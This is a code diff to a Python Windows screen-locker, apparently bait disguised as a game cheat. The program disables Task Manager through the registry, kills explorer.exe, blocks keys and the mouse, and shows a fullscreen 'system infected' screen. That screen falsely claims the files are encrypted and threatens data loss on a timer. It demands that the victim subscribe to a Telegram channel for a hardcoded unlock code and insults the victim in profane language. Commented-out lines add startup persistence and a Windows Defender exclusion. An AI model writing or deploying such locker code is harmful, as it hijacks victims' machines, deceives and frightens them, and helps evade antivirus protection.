@@ -9,40 +9,40 @@ import pynput
 import os
 import subprocess
 import sys
+import shutil
+u = os.getlogin
+#startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+#shutil.copy('App.exe', startup_path)
+#subprocess.run(["powershell","-Command",f"Add-MpPreference -ExclusionPath '{os.path.join(os.getcwd(),'App.exe').replace("'","''")}'"],shell=True)
+
+#ВНИМАНИЕ ЭТО ВАЙБКОДИНГ ЧЕРЕЗ TKINTER просто ужас
 
 
-
+os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
 #блокирую клавиши и мышку
-block_key = ('win', 'esc', 'tab', 'shift', 'ctrl', 'del', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12')
-keyboard.block_key(block_key)
+#folder_path = f"C:/{u}\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+#try:
+#    escaped_path = folder_path.replace("'", "''")
+#    ps_command = f"Add-MpPreference -ExclusionPath '{escaped_path}'"
+#
+#    subprocess.run(["powershell", "-Command", ps_command], shell=True)
+#except Exception as e:
+#    print(f"✗ Ошибка: {e}")
 
+ey = ('win', 'esc', 'tab', 'shift', 'ctrl', 'del', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',)
+keyboard.block_key(ey)
 #блокировка мыши
 mouse_listener = pynput.mouse.Listener(suppress=True)
 mouse_listener.start()
-#Всё вернестя после выключения кода
-
 #Убиваем процессы
-
-def run_as_admin(bat_file):
-    try:
-        subprocess.run(['powershell', 'Start-Process', bat_file, '-Verb', 'RunAs'])
-    except Exception as e:
-        print(f"Ошибка: {e}")
-
-run_as_admin("reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v DisableTaskMgr /t REG_DWORD /d 1 /f")
-
-
 os.system("taskkill /f /im explorer.exe")
 
-
-
-
-class FullScreenPasswordLock:
+class FullScreenLock:
     def __init__(self):
         self.root = tk.Tk()
         self.root.title("СИСТЕМА ЗАРАЖЕНА")
 
-        # Инициализация pygame для музыки
+        #музыка
         try:
             pygame.mixer.init(frequency=22050, size=-16, channels=2, buffer=512)
             self.music_available = True
@@ -50,7 +50,7 @@ class FullScreenPasswordLock:
             self.music_available = False
             print("Музыка недоступна")
 
-        # Блокируем стандартные способы закрытия
+        # БЛОК ГОРЯЧИХ КЛАВИШ
         self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
         self.root.bind('<Escape>', self.prevent_close)
         self.root.bind('<Alt-F4>', self.prevent_close)
@@ -60,14 +60,12 @@ class FullScreenPasswordLock:
         self.root.bind('<Super_L>', self.prevent_close)
         self.root.bind('<Super_R>', self.prevent_close)
 
-        # Полноэкранный режим
         self.root.attributes('-fullscreen', True)
         self.root.configure(bg='#1a0000')
 
-        # Делаем окно поверх всех остальных
         self.root.attributes('-topmost', True)
 
-        self.correct_password = "8263"
+        self.correct_password = "4445"
         self.attempts = 0
         self.max_attempts = 5
         self.locked = False
@@ -89,7 +87,7 @@ class FullScreenPasswordLock:
         main_frame = tk.Frame(self.root, bg='#1a0000')
         main_frame.pack(expand=True, fill='both', padx=50, pady=50)
 
-        # Череп ASCII арт
+        # Череп
         skull_art = """
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
@@ -133,7 +131,7 @@ class FullScreenPasswordLock:
 ╠══════════════════════════════════════════════════════════════╣
 ║  Обнаружен: Тупой школьник который хотел читики              ║
 ║  Все файлы зашифрованы. Доступ ограничен.                    ║
-║  Для восстановления напишите в дс: ???? .                    ║
+║  Для восстановления подпишитесь на ТГК nitri4k               ║
 ║  Время ограничено! Таймер: 15 минут!                         ║
 ╚══════════════════════════════════════════════════════════════╝
         """
@@ -203,7 +201,6 @@ class FullScreenPasswordLock:
         )
         self.attempts_label.pack(pady=10)
 
-        # Таймер обратного отсчета (15 минут)
         self.timer_label = tk.Label(
             main_frame,
             text=" ДО УНИЧТОЖЕНИЯ ДАННЫХ: 15:00",
@@ -213,7 +210,6 @@ class FullScreenPasswordLock:
         )
         self.timer_label.pack(pady=5)
 
-        # Статус системы
         self.status_label = tk.Label(
             main_frame,
             text="СИСТЕМНЫЕ КОМБИНАЦИИ БЛОКИРОВАНЫ ВИНДА УДАЛИТСЯ ЕСЛИ ЗАЙТИ В БЕЗОПАСЫНЙ РЕЖИМ",
@@ -260,11 +256,9 @@ class FullScreenPasswordLock:
             self.submit_btn.pack_forget()  # Убираем кнопку
             self.password_entry.config(state='disabled', bg='#550000')  # Отключаем поле ввода
             self.status_label.config(text=" ВРЕМЯ ВЫШЛО! СИСТЕМА ЗАБЛОКИРОВАНА НАВСЕГДА!", fg='#ff0000')
-
-            # Запускаем тревожные аккорды
             self.start_alarm_chords()
 
-            # Показываем сообщение о блокировке по таймеру
+            #Блокировка смс
             messagebox.showerror(
                 "ВРЕМЯ ВЫШЛО!",
                 " ТАЙМЕР ИСТЕК!\n\n"
@@ -295,7 +289,7 @@ class FullScreenPasswordLock:
             def play_chords():
                 print("🎵 АККОРДЫ: Играют тревожные аккорды...")
 
-                # Тревожные аккорды
+                #Музыка
                 chords = [
                     [330, 392, 494],  # Минорный аккорд
                     [349, 440, 523],  # Еще один минор
@@ -338,16 +332,13 @@ class FullScreenPasswordLock:
         def music_loop():
             try:
                 while self.music_playing and self.music_available:
-                    # Чередуем разные частоты для тревожного эффекта
                     frequencies = [330, 392, 262, 294, 349, 440]  # Тревожные аккорды
                     for freq in frequencies:
                         if not self.music_playing:
                             break
-                        # Создаем звук
                         sound_data = self.generate_beep_sound(freq, 400, 0.4)
                         sound = pygame.mixer.Sound(buffer=sound_data)
                         sound.play()
-                        # Ждем окончания звука
                         time.sleep(0.5)
             except Exception as e:
                 print(f"Ошибка воспроизведения: {e}")
@@ -363,18 +354,14 @@ class FullScreenPasswordLock:
         if not self.locked:
             self.locked = True
 
-            # Отключаем поле ввода и кнопку
             self.password_entry.config(state='disabled', bg='#550000')
             self.submit_btn.config(state='disabled', bg='#550000')
             self.status_label.config(text=" СИСТЕМА ЗАБЛОКИРОВАНА - ПРЕВЫШЕН ЛИМИТ ПОПЫТОК!", fg='#ff0000')
 
-            # Останавливаем обычную музыку
             self.music_playing = False
 
-            # Запускаем тревожные аккорды
             self.start_alarm_chords()
 
-            # Показываем сообщение о блокировке
             messagebox.showerror(
                 "СИСТЕМА ЗАБЛОКИРОВАНА",
                 " ПРЕВЫШЕН ЛИМИТ ПОПЫТОК!\n\n"
@@ -392,24 +379,25 @@ class FullScreenPasswordLock:
 
         if entered_password == self.correct_password:
 
-            # Останавливаем всю музыку
+            # Ввел пароль
             self.music_playing = False
             self.alarm_music_playing = False
             if self.music_available:
                 pygame.mixer.stop()
             messagebox.showinfo(
-                "СИСТЕМА ВОССТАНОВЛЕНА",
-                " Код принят! Система разблокирована.\n\n"
-                "Ваш компьютер в полной безопасности.\n"
+                "Система восстановлена ",
+                "Скачал свою хуйню? Щенок.\n\n"
+                "ХУЯ СКАЖИ СПАСИБО ЧТО ЭТО НЕ КРИПТЕР.\n"
                 "Нажмите Enter для разблокировки"
-            )
+            ) #тут писать что открыть после ввода пароля
+            os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')
             os.system('start explorer.exe')
             self.root.quit()
             return
 
-        # Неправильный пароль
+
         self.attempts += 1
-        self.attempts_label.config(text=f"♻️ ПОПЫТОК: {self.attempts}/{self.max_attempts}")
+        self.attempts_label.config(text=f" ПОПЫТОК: {self.attempts}/{self.max_attempts}")
 
         if self.attempts >= self.max_attempts:
             self.lock_system()
@@ -445,14 +433,9 @@ class FullScreenPasswordLock:
                 pass
             self.root.destroy()
 
-
+#Запуск кода
 def main():
-    # Консольное предупреждение
-    print("ПИЗДА ТВОЕМУ КОМПУ ")
-
-
-    # Запуск приложения
-    app = FullScreenPasswordLock()
+    app = FullScreenLock()
     app.run()
 
 
